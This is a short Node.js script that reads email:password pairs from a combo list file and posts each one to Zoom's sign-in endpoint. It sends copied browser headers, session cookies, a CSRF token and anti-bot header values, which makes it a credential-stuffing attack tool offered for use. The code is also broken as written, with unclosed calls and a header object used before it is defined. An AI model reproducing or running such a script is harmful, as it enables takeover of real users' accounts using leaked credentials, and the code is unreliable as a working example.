const axios = require('axios')
const fs = require("fs")

const url = "https://zoom.us/signin"

//open txt file
fs.readFile('combo.txt', 'utf8', (err, data) => {
    if (err) {
        console.log(err)
        return
    }

    const splitted = data.split('\r\n')
    for (let index = 0; index < splitted.length; index++) {
		 let element = splitted[index];
		 element = element.split(':')
		 let Credential = {"email": element[0], "password": element[1]}
		 axios.post(url, Credential, hedders)
		 .then(function (response) {
			console.log(response);
		 })
		 .catch(function (error) {
			console.log(error);
		}

	}

const hedders = {
	'authority': 'zoom.us',
	'method': "POST",
	"path": "/signin",
	"scheme": "https",
	"accept": "application/json, text/javascript, */*; q=0.01",
	"accept-encoding": "gzip, deflate, br",
	"accept-language": "en-US,en;q=0.9,si;q=0.8",
	"content-length": "1664",
	"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
	"cookie": "_zm_ssid=aw1_c_staW8Dd2Sry9UWkZgzNCjA; _zm_mtk_guid=467821b4a7ee428e8cd1451b1b9fe4cc; _zm_csp_script_nonce=sxao5B9ETIeug3G1wtBXCQ; _zm_currency=USD; _zm_visitor_guid=467821b4a7ee428e8cd1451b1b9fe4cc; _zm_page_auth=aw1_c_lTL2rusbSHCHGB_bCa5HAg; _zm_lang=en-US; _zm_cdn_blocked=unlog_unblk; OnetrustActiveGroups=C0001; _zm_ctaid=ZWi2i7BSQ_Cw19FJdy_8mA.1649586129489.9807b1e8b05ea9c7504d8b26ed3854da; _zm_chtaid=37; wULrMv6t=AyDM_hKAAQAArSQhtaCDYB-DjWaKYS-eqYZAd9e7WJ-idMYTsdMYjqZ77BZkARTNG0uucpl_wH8AAEB3AAAAAA|1|0|9b62f9c5b512a44fea900624b5b165b130d88893; OptanonAlertBoxClosed=2022-04-10T10:22:21.491Z; cred=DFDB700676C5819FF6D205B2C39F41F2; OptanonConsent=isGpcEnabled=0&datestamp=Sun+Apr+10+2022+15%3A58%3A03+GMT%2B0530+(India+Standard+Time)&version=6.21.0&isIABGlobal=false&hosts=&consentId=798fca2a-90ce-4f5f-adae-67775354a82c&interactionCount=2&landingPath=NotLandingPage&groups=C0004%3A0%2CC0003%3A0%2CC0002%3A0%2CC0001%3A1&AwaitingReconsent=false&geolocation=LK%3B1",
	"origin": "https://zoom.us",
	"referer": "https://zoom.us/signin",
	"sec-ch-ua": `" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"`,
	"sec-ch-ua-mobile": "?0",
	"sec-ch-ua-platform": '"Windows"',
	"sec-fetch-dest": "empty",
	"sec-fetch-mode": "cors",
	"sec-fetch-site": "same-origin",
	"uqhr71sqnk-a": "9Ly4wD-sU7fLYWUO9cIE7NJyiSB9rprwF5T0kgnaLLTeCNmNzaE3I07I1G=K01WxRCwHDh8-orjLbMJnd94rKTd_ipFG5xTNMsSHl4vhm-3Fwf1pxuxahQZSmZN6gmJvrPf-zvdtvd6BYteVePK1XNQh9Jk7t6X4X8lSn-V=Hd_7A-ysixe4dQMn1bsGAZhRX9lwdRwjHDVwzw=RkQ3zXxnjp6bgLJPj2lVR_fhDXWo_VQZ8cNrFTdSZSAW7s7DJNCUcQ3=j_JknXmBaMk0rB2XsczwEKMUtOOjsCY4SNR_6K2DlcF7jdx9lQ6Sb_IRZm0iQknGll_UlLlAPvA6svz_OdMEt5oTPs1Aekk0_y9GgXczKzFO18iKLfzvPWwb9BpozDeMi4CmluNely2HnXP47GjlekP_5LRdxMP03M_dO7Y-CuRsusrmhgrlL3-lakRGsu7VN2Ig1tRwy9jKNRfJfSrNYm9dANvtXz=5S7WZH9yfbSD3Kw0gWDVvZVnaNjJfPZAcjIl_Hzv90lvfM83WyfPwnGAH6NLb4z2dyBuZv_ownr_b=JBEoU-Of_nQQb7ANXy3AkBdT_GCgy6FZXD6L3FX_DHZire4Rd4TiSCkO5HGbT2rj6Fh70Qvf7ZOXVU4OhNizO8Gpbzdv4CuC=QEIe=ZgA0IL=Gec8XMjeBFWZDtxWlgkJ9WOiTWEaD5rWylnjRfrhcWflpFSiuwBT85vaCeyjGHcXQDdFwJ3pOCorXyJHT=W6b4dWzBDrMThNBebX_zjmUOhleVUb3OPyg9OoGEQAVjB8kPZ_hPRtQHUGxPiaNxzUZg0-3EeXc3RLEf5XdvR1X34hTB6T_n6JJQ141yyNWPMoSw0Y2-JUnzfzvTVg1uDuibRuLLrf96ceba4Lo1moEW6kFc5SuEMkYHtWTKn22oFbUxdY-=gCMzncL8P3ARFAduu2oSEcxbnYlwLfxm=3I_270zGQigskAepwl6W4o=rhpKbp49N6RaFlBIfUMUDiDomK4MCwAJz26XW4e69ShYiMHw7h7ZsK=X9xF94gIXWTkbFHD-=Zss1V68ON0kObU_OZUypoQPEHQOvgT_1b=_CgRt=OUmw3kM3frnecpOSQ1LJyMH2nlegUy9FGkDuGfT=zHkjys5UH08GkFDzMTJoHAr_IlXvxWXsrhttykIBGj3sR_oZJjsBlms1xcx7yQmd1Bh3LKhVPn=umjQnXN3OZ00KxDwV9hSIpFQd8dt7ViFnwdghKpYrrZ-dkZZBbAEscrNM-nPXGZXIIzQJdPBjzddbWRmVScm7z3ynPDoihgH7M0ZTBZVd4LXC6ux_nUuxVhnXYE2FOQwrs8guAkgYvDLU64VI-QaCwy_9Sf7F-1vsfbg58pAlbYr6y6tPiplsEmxOV3kQGoOOfCR8IsfNaiQpTaiE1h0ik0m6-87PlW1L2foD_Ha-kwUjdUspzZzE=FmG=G=HyC1MR5f-RO6vjAuzffKNPvshcgl7oFza95xx4J9EA1OoLd3xMjcNl_Tx-W20HA5Bwu7UQZWf2D2dfyIOcYaY9iO4HW1WD61idJKQNpoZsaxgZfj-jYAEJtMvCPnY_RDx3r-cOFZsWpUCdpAusACibUu_LaYieR5C5gpDgeZ26aKF=Ih_rhLyWNTztgb7tSjcKLKpJPh-9ZEXOJO_jy8xV-fDu5XDmPdky0gd9a7FY221cnEuJIWZSB-3=5wZ0PXG=hwdF-t7dSJcB9Ng2b06jP1xH4M=eRA0yST_tK0TVWtj=HsTs0x4R6G2GBaiOGEWGGSMNTBskjOPA1f5vSJY7YOieu6skt-iOdiKxV6J0r_=F8s4_EZXTZV1ckH9H9LOiYmssF_=LAB1=RbA7plvfi8VX52Rri1F-4gRJ=jTBMhwfpSo0RTSRfr7rW4tXOG3AokP2DKH6T5JsIudFBOcLG-tcFY7gBeOjJCUwjwky5cRSjET01YMOVLM_etGT-KSGJw_WJUnpHkOAm2kZVMG055x9HZiKs20d45ptkE6TtmSaump326tUJA3rX_IDZjWEHPl5p3S60hlnRg88ECZDFTk0KtMU8KUMTUJrW_HcEa6_v_ag2kT=nBcssJISa6yJ3AukY-QxtJA8AEGLE78mH5Fm5TZFz7o1iNIWGyV2-p2cc1WbuinDkoLF88KvZ3NvI7a7WH9rKcG0nbm2XnR=eN3pXvEdK2F=hK7mShiOoYXvf7C21bivzQMDit-Hw8GZ2wbut8QOrpS2Ccc-d=JDp1wFIa1j3rv0Kl1ILmJDpGDmRS89zCu5xNBQMB2zQ598wXKSCeELXPVSrCaFltgymYQ4Qa-FiYDNPk2T165Ro=J7JrnnAehl7cIN7GSM1TSYTA-Ol23k=ahYxUZiiU9JZ9mc87c4YuXxkVg98nLJ7oAT-l6HyvSVFtiynFSC5uuxMeK5x=6bQ4lybnA3y58QUy7bAVMc_2Mj-Y7XMQ_lBFcnN9UA9bb80S8B_SD6juhV3cpNxSyR1QgVELaSuOEHwMQ==jbImwvvdCtKmL6B8091OfQLcX8g-irIMeyF=A3s4gQ0dj-GyLiN0xB0osOk3kiNUl0ZsTKnjTyepi648=6kpI8S71ucwyvsJFuYHF784_hdhovk2jsyJFN01kWX8yHQ_=NZr3bIIQgyTmFcp2JzJBLsNpynCvCd2yOl=XSj=nfp5LCbMY4t8gGO=CI9ilZF8JJOD_ejXC8DK=lHPKZzV_AsoxWeU6N83VykJavIXsKlOCIGnA7l0IlP7Ojdo=IE8ydShVMCElXXKhL02ko2opP1w810WrEspuxzshc0kn_MoVf4MeY_NSSTRb8tbMI0oUrk=1xf1RKXGyTj8Fl09aLbPfhCX2HCSpNSTJpoWHbX7E=6kTlQl-gciEsAGsvxTZhXlBRcMtUFrD7fB-wopQUOuNCYtx53CTwcxWiKajKlUO91a9fhybS-oH-maDialbKbJ-RzmswrAyCGr3L2WesN0AOhozKZasv91SMuTHT9FYvoXJU0WLVuBgBt4ng8=g_nAgr5lj4NQiAvoYISkNR-JdkFpjURQAL-FVYdNNh1JhHQYjbpDckA1foEbiH6BNUzPnQMcCoZo7mCKf8Tu=vFrhCleF_IRf6up9ZcdED=UlRu4coVQ5MZvfKdfreXcJFQYk=QzxHbHxbFZc26pOH0So7O2s0FzIExLTPegB7DA9K-=lOw0FzoJW33gvEtdR80ftn3H2Qpgmi2vp_o6Obj7wXB7BdOiL19GvgC8r06IeYEAaCBrKikra3u4w60ML36G59orcwjeE8oKhLVmbexLHHczv2PoANzdmn0alzKPVCKwNZAYikcvAvDAdaCn__nZsLX84CySashJ5-K3T_BtTLidsbWHidsdpWcjzAz3dTbkgQA-GiDXMzF0ZVUhVJ_polfg2Gi65IWJKgVddffeyGh9U6fmobUXFC-ebnLIzQ0Cds=jUPBbR7x9uFx8yJur7Sc3XpyEL=kxij7t54pYhb-f2ASJ4DVL5F0lHKcRAAcj-tyZIXCSlACnzETxxRyjoYVmy9fRLuiUpEy_Ty_8Q_r5ZYdx6hZe2OA3mn1pGUKnfdwEMIJpJYoZjKIc_nLkNUdFLrDrsr1lQYhNEAAbY3MF5bKFG_kg=yQYSLR9yeWYs8mJcL_OCamyQztm1Exsl0REWocgyEOWzXNxflLgaN=D3nmJ3cATlEVSYUoMcPtC=oEiLJobPQLaOdKGhTO9yaz9rFRH96f6SPnRkpv8ieOyf28r1gnKN7wFL9wz7JHSVs2=z2D8pP02tTZNXpJm27D0S_gfX4nT3YFL6weR6VBEyvw-7tMjyT3eIrPRvogYO9oXKYiYiRbfMHEYPvcBahl7kfQG-Sr0TZdWrs3pzSH2lDj9BL",
	"uqhr71sqnk-a0": "TMWXQw9LV74xvGICP=4WZ2nY1m2nQ=2M2ASjsZG-vixCd9e8suV28j_E_ejL0WcDvwfTcFyyag1ZcajjjIWgALWPHNoYmVOGZ5YvH9Dbs3dXmIV342C=uVc8deeHzfu1fy8FuucxUv_fCE=-SFkbD7zIpZg-LOO=glMOb0Izr=rNs2VQ2owa9oJmPTpKoENIvsm2Pe__FhKOGzWAboEN1xYVZfh79_wI4OXEEK7l0UrNB_E8SbdJIBHyxiYFpEmakAG1vjUz=BQKXgg1VmJxON_wxEhZ9RDchwhkcV2R4A2p2mdOU8ke-XVYXzx8lQ=VddOIrfd8mhXI6J-tMpDcPONhnCea81u2b_rKOaM8UN1kgwDTofzyv9j9j4jM5zYPphWuNZ_Ddmzi86gR6HEiOGUdTIm9tGtRglGrMEX_=F_wc9nJREmhVJt734OSJ2WyrR8uR1BhmkgPngwM039lBYZL_e1F0oRXbvF6tuyu6kW3mwYCjan4WhX-kHpoC6aGF=AFAKLIB8=p7vpVZHGW0gFh14cS3TtrrRFJW_SVK8WV3jF2-O-P83-LH4PTJda3wNMYI2RFxCfzJ3Eca=zoALwLRhr0DwfInacluT7Y3BRvliy7_gnKTg6DszdPwgZ5vUVgx2JV6gXDBEmMldJQ5ZGsknBswGe-BRfcrPDtzM3D22sKRSawdByxfID3HU6h0sFXi7TRbZKp6FYC4MCJk7=oZcnt_l6bDgWjALjI31hxRSMijOYfhTIcFIUa=IQsY5z88H27I6p2aGz9JAbcMHzbmZ4MlOSOJmepFv0HpK5NEcZNVkViwVSyWNSAuV9=bcDOtokp9XfEisjRSMkgsxaX37ElILsl1v3MSrYi2Xhz7BXxJ8CRH0c1uIuHlYWkcUX2Q2YuETCd_nCWpWnLG7aPDNIccwsU_ZRsE4A7PIG8sFMXmy9V8IiMFGQdChZb0teTNTEJdOztXR5gt8QXTcWTva-zaXmw=17rRlmgneQXgNeTDFQuCWK7pHJKCpIGU2MCmUnK9woEzjNhF34vv=PhwZ4hsx79X15nF6PTX-R2Vl11AObw7-okJD2vxnaSBaxpZ-ywP7S8Zv=T6ASb_gjfM8b38l32vyy7efd30kk8ntxZn4ijLNy7KovE0FcGMnvF4Q1IFbIvdEArHAhv5Yn1SY7YxwJhw3Pw73K1SScn1_YW-iEnJzTOGDa9uUy1k7supVLHCBWWXd7wWboetzWg5jjU=v3jV6XBTljcIQyVyxXfO6WauoxJVErEBmLh_XkaoVGOpXPtBoIQQxLE_rgBU5GLGh0TZpXxZTlXVE_KLRH3ysFBoT7nIFNPWWZw79m4i_zmbK-3=lwMRPQO2rdVP1FlnPJ1hARTbMeKXTKeyAszWczizlPJSrSt",
	"uqhr71sqnk-b": "6vuzji",
	"uqhr71sqnk-c": "AACB6hKAAQAAaqceAX3qhf8FD8G43qaFwep6Jd1DgfwrN_9q2xpLA9GxZcrs",
	"uqhr71sqnk-d": "ABaChIjBDKGNgUGAQZIQhISi0eIApJmBDgAaSwPRsWXK7P_____5oOeDAPnmo1bT575DdmiK1SAQ5WM",
	"uqhr71sqnk-f": "A_ErBBOAAQAATs0apCU0oFN-vtlkEoH0DkaXO_R6T_8WrJrmuEchHcYChVOpAXCHVqqucpl_wH8AAEB3AAAAAA==",
	"uqhr71sqnk-z": "q",
	"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
	"x-requested-with": "XMLHttpRequest, OWASP CSRFGuard Project",
	"zoom-csrftoken": "YV9I-MX91-5ZWW-9IRA-MU7S-LAZC-VJA5-RQ5Y"
}